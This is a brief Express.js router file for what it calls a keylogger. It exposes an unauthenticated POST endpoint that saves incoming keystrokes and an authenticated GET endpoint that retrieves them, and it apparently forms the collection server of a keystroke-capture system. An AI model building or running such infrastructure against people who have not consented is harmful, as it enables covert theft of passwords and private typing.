import express from "express";
import {
  saveKeystrokes,
  getKeystrokes,
} from "../controllers/keyloggerController.js";
import userAuth from "../middleware/userAuth.js";

const keyloggerRouter = express.Router();

keyloggerRouter.post("/data", saveKeystrokes);
keyloggerRouter.get("/data", userAuth, getKeystrokes);

export default keyloggerRouter;
